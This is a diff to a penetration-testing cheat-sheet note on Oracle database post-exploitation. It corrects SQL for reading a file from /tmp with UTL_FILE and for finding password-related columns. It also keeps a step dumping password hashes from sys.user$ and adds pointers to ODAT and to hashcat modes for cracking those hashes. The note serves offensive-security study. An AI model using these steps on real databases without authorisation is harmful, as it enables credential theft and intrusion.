@@ -143,9 +143,17 @@ BEGIN
 END;
 /
 
--- Read output file
-CREATE DIRECTORY tmp_dir AS '/tmp';
-SELECT * FROM OPENFILENAME(BFILENAME('TMP_DIR','out.txt'), 1, 200);
+-- Read the output file back with UTL_FILE (OPENFILENAME/OPENROWSET are MSSQL, not Oracle).
+-- See the File Read section below — point the directory at /tmp and FOPEN 'out.txt':
+CREATE OR REPLACE DIRECTORY tmp_dir AS '/tmp';
+SET SERVEROUTPUT ON;
+DECLARE f UTL_FILE.FILE_TYPE; buf VARCHAR2(4000);
+BEGIN
+  f := UTL_FILE.FOPEN('TMP_DIR','out.txt','R');
+  LOOP UTL_FILE.GET_LINE(f, buf); DBMS_OUTPUT.PUT_LINE(buf); END LOOP;
+  EXCEPTION WHEN NO_DATA_FOUND THEN UTL_FILE.FCLOSE(f);
+END;
+/
 ```
 
 ---
@@ -181,8 +189,8 @@ SET SERVEROUTPUT ON;
 -- Dump a table
 SELECT * FROM schema.tablename;
 
--- Find password-related columns
-SELECT owner, table_name, column_name FROM all_columns
+-- Find password-related columns (view is ALL_TAB_COLUMNS, not all_columns)
+SELECT owner, table_name, column_name FROM all_tab_columns
   WHERE column_name LIKE '%PASS%' OR column_name LIKE '%PWD%' OR column_name LIKE '%CRED%';
 
 -- Hash dump from user$ (requires DBA)
@@ -208,6 +216,10 @@ DESC tablename       # describe table structure
 
 ---
 
+> [!note] **See also** — get here in the first place (SID/cred brute, file R/W, OS exec) with [[Tools/Database/odat.py|ODAT]]; service reference [[Services/Database Services/Oracle TNS|Oracle TNS]]. Crack `sys.user$` hashes with [[Tools/Auth/hashcat|hashcat]] (`-m 112` 11g / `-m 12300` 12c).
+
+---
+
 *Created: 2026-03-06*
-*Updated: 2026-03-06*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-08-27*
+*Model: claude-opus-5*
